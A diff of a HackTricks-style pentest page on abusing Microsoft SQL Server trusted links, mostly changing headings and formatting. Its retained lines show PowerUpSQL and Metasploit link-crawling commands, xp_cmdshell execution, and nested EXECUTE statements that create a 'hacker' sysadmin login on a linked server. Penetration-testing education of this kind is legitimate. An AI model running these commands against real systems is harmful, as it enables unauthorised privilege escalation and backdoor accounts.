@@ -1,4 +1,4 @@
-
+# MSSQL Trusted Links
 
 <details>
 
@@ -16,15 +16,14 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
+## MSSQL Trusted Links
 
-# MSSQL Trusted Links
-
-If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA). \
+If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA).\
 Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
 
 **The links between databases work even across forest trusts.**
 
-## **Powershell**
+### **Powershell**
 
 ```bash
 Import-Module .\PowerupSQL.psd1
@@ -77,7 +76,7 @@ Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"
 Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
 ```
 
-## Metasploit
+### Metasploit
 
 You can easily check for trusted links using metasploit.
 
@@ -89,7 +88,7 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 
 Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)
 
-## Manual - Openquery()
+### Manual - Openquery()
 
 From Linux you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py** and run queries like:
 
@@ -101,10 +100,10 @@ From Windows you could also find the links and execute commands manually using a
 
 _Login using Windows authentication:_
 
-![](<../../.gitbook/assets/image (167).png>)
+![](<../../.gitbook/assets/image (167) (1).png>)
 
 _Find links inside the accessible MSSQL server (in this case the link is to dcorp-sql1):_\
-__`select * from master..sysservers`
+\_\_`select * from master..sysservers`
 
 ![](<../../.gitbook/assets/image (168).png>)
 
@@ -117,7 +116,7 @@ You can continue these trusted links chain forever manually.
 
 Some times you won't be able to perform actions like `exec xp_cmdshell` from `openquery()` in those cases it might be worth it to test the following method:
 
-## Manual - EXECUTE
+### Manual - EXECUTE
 
 You can also abuse trusted links using EXECUTE:
 
@@ -126,8 +125,6 @@ You can also abuse trusted links using EXECUTE:
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-
-
 
 <details>
 
@@ -144,5 +141,3 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 **Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**
 
 </details>
-
-
